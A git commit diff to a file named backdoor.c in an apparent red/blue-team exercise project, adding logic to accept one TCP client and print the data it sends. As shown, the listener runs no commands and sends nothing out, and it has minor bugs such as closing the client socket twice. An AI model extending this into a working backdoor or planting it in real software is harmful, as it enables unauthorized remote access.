f8540c27a1f0f3536bdf20e47a5771628424e0ae
mfaluoti2564 <mfaluoti2564@gmail.com>
2026-04-16 14:20:29 -0400

    Added more functionality to backdoor.c

--- blue_red/src/backdoor.c
+++ blue_red/src/backdoor.c
@@ -2,35 +2,60 @@
 
 BOOL StartBackdoor(void) {
     SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
-    struct sockaddr_in address;
+    struct sockaddr_in address = {0};
     int opt = 1;
-    BOOL success = FALSE;
 
     if (s == INVALID_SOCKET) {
         printf("[BACKDOOR] Failed to create socket.\n");
         return FALSE;
     }
 
-    // Set to non-blocking mode
     setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(int));
 
     address.sin_family = AF_INET;
     
-    // Use inet_pton for Wide/Unicode strings or inet_addr with char*
     if (inet_pton(AF_INET, BACKDOOR_HOST, &address.sin_addr) == 1) {
         address.sin_port = htons(BACKDOOR_PORT);
     } else {
-        // Fallback to inet_addr (older, simpler)
         address.sin_addr.s_addr = inet_addr(BACKDOOR_HOST);
     }
 
     if (bind(s, (struct sockaddr*)&address, sizeof(address)) != SOCKET_ERROR) {
         if (listen(s, SOCKET_BACKLOG) != SOCKET_ERROR) {
-            // Use inet_ntoa for Wide String compatibility
+            // Show we're listening
             char hostip[16];
             inet_ntop(AF_INET, &address.sin_addr, hostip, sizeof(hostip) - 1);
             printf("[BACKDOOR] Listener ready on %s:%d\n", hostip, BACKDOOR_PORT);
             printf("[BACKDOOR] Waiting for client...\n");
+            printf("[BACKDOOR] Press Ctrl+C to stop.\n");
+
+            // Now accept connections
+            SOCKET client = accept(s, NULL, NULL);
+            if (client != INVALID_SOCKET) {
+                printf("[BACKDOOR] Client connected from %d\n", client);
+                
+                // Receive loop
+                while (TRUE) {
+                    int bytes = recv(client, hostip, sizeof(hostip) - 1, 0);
+                    if (bytes > 0) {
+                        hostip[bytes] = 0;
+                        printf("[BACKDOOR] Received: %s\n", hostip);
+                    } else if (bytes == 0) {
+                        printf("[BACKDOOR] Client disconnected.\n");
+                        closesocket(client);
+                        break;
+                    } else {
+                        printf("[BACKDOOR] Receive error: %lu\n", GetLastError());
+                        closesocket(client);
+                        break;
+                    }
+                }
+
+                closesocket(client);
+            } else {
+                printf("[BACKDOOR] Failed to accept client.\n");
+            }
+            closesocket(s);
             return TRUE;
         }
     }
